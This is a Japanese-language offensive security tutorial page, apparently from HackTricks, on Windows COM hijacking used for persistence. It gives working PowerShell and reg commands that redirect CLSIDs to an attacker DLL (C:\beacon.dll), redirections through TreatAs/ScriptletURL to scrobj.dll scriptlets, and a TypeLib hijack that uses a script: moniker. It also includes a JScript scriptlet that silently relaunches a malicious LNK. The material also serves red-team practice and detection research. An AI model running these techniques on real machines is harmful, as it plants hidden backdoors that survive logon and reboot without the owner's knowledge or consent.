# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しない COM コンポーネントの検索

HKCU の値はユーザーが変更できるため、**COM Hijacking** は**永続化メカニズム**として使用できます。`procmon` を使用すると、まだ存在せず、攻撃者によって作成可能な COM レジストリを簡単に見つけられます。典型的なフィルター:

- **RegOpenKey** 操作。
- _Result_ が **NAME NOT FOUND**。
- _Path_ が **InprocServer32** で終わる。

ハンティング時に役立つバリエーション:

- 欠落している **`LocalServer32`** キーも探します。一部の COM クラスは out-of-process server であり、DLL の代わりに攻撃者が制御する EXE を起動します。
- `InprocServer32` に加えて、**`TreatAs`** および **`ScriptletURL`** のレジストリ操作も検索します。最近の detection content や malware writeup では、これらが通常の COM 登録よりもはるかに稀であり、high-signal であるため、繰り返し取り上げられています。
- 登録を HKCU に clone する際は、元の `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` にある正規の **`ThreadingModel`** をコピーします。誤った model を使用すると activation が失敗し、hijack が目立ちやすくなります。<sup>[[3]](#references)</sup>
- 64-bit システムでは、64-bit と 32-bit の両方の view（`procmon.exe` と `procmon64.exe`、`HKLM\Software\Classes` と `HKLM\Software\Classes\WOW6432Node`）を確認します。32-bit アプリケーションは、異なる COM 登録を解決する可能性があります。

偽装する存在しない COM を決めたら、次のコマンドを実行します。_数秒ごとに load される COM を偽装する場合は、やり過ぎになる可能性があるため注意してください。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks は Custom Triggers を使用して COM objects を呼び出します。また、Task Scheduler を介して実行されるため、いつトリガーされるかを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認し、例えば**ユーザーがログインするたびに**実行されるものを1つ選択できます。

次に、**HKEY\CLASSES\ROOT\CLSID**、HKLM、HKCU で CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を検索すると、通常はその値が HKCU に存在しないことがわかります。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
その後、HKCU エントリを作成するだけで、ユーザーがログインするたびに backdoor が起動します。

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` を使用すると、ある CLSID を別の CLSID でエミュレートできます。<sup>[[4]](#references)</sup> 攻撃者の観点では、元の CLSID はそのままにして、`scrobj.dll` を指す per-user CLSID を作成し、`HKCU\Software\Classes\CLSID\{Victim}\TreatAs` で実際の COM オブジェクトを悪意のあるものへリダイレクトできます。

これは、次のような場合に有用です。

- 対象アプリケーションが、ログオン時またはアプリケーション起動時に安定した CLSID をすでにインスタンス化している
- 元の `InprocServer32` を置き換える代わりに、registry-only のリダイレクトを使用したい
- `ScriptletURL` value を通じて、local または remote の `.sct` scriptlet を実行したい

Example workflow（public Atomic Red Team tradecraft および過去の COM registry abuse research を参考に調整）:
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` は `ScriptletURL` の値を読み取り、参照先の `.sct` を実行するため、payload をローカルファイルとして保持することも、HTTP/HTTPS 経由でリモートから取得することもできます。
- 元の COM registration が HKLM で完全かつ安定している場合、`TreatAs` は特に便利です。レジストリツリー全体をミラーリングする代わりに、ユーザーごとの小さな redirect だけで済むためです。
- natural trigger を待たずに検証するには、対象の class が STA activation をサポートしている場合、`rundll32.exe -sta <ProgID-or-CLSID>` を使用して fake ProgID/CLSID を手動で instantiate できます。

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) は COM interfaces を定義し、`LoadTypeLib()` 経由でロードされます。COM server が instantiate されると、OS は `HKCR\TypeLib\{LIBID}` 配下の registry keys を参照して、関連付けられた TypeLib もロードする場合があります。TypeLib の path を **moniker**、例えば `script:C:\...\evil.sct` に置き換えると、TypeLib が resolve された際に Windows が scriptlet を実行します。これにより、一般的な components が使用されたときに trigger される、stealthy な persistence が実現します。

これは Microsoft Web Browser control（Internet Explorer、WebBrowser を embed する apps、さらには `explorer.exe` によって頻繁にロードされる）に対して確認されています。<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) high-frequency な CLSID が使用する TypeLib (LIBID) を特定します。malware chains で頻繁に abuse される CLSID の例: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)。
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) `script:` monikerを使用して、ユーザー単位のTypeLibパスをローカルのscriptletに向けます（管理者権限は不要）:
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 最小限の JScript `.sct` を配置し、主要な payload（初期チェーンで使用する `.lnk` など）を再起動する：
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE、WebBrowser control を埋め込んだアプリケーション、または通常の Explorer 操作を開始すると TypeLib が読み込まれ、scriptlet が実行されるため、ログオンや再起動時に chain が再び有効になります。

クリーンアップ
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
注記
- 同じロジックを他の高頻度な COM コンポーネントにも適用できます。まず `HKCR\CLSID\{CLSID}\TypeLib` から実際の `LIBID` を必ず解決してください。
- 64-bit システムでは、64-bit コンシューマー向けに `win64` サブキーを追加することもできます。

## 参考文献

- [1] [TypeLib を Hijack する – 新しい COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: 米国企業を標的とした高度な Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking を再考する (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
